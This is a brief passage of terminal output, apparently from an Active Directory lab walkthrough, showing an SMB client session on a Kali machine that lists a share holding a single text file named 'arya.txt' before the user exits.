  arya.txt                            A      413  Sun Apr 13 19:13:30 2025

                10485247 blocks of size 4096\. 6152243 blocks available  
smb: \\\> cd  
Current directory is \\  
smb: \\\> ls  
  .                                   D        0  Tue Aug 26 16:43:38 2025  
  ..                                  D        0  Tue Aug 26 16:43:38 2025  
  arya.txt                            A      413  Sun Apr 13 19:13:30 2025

                10485247 blocks of size 4096\. 6152243 blocks available  
smb: \\\> ^C  
                                                                                                                                                     
┌──(kali㉿kali)-\[\~/goAD-lab\]  
└─$ 

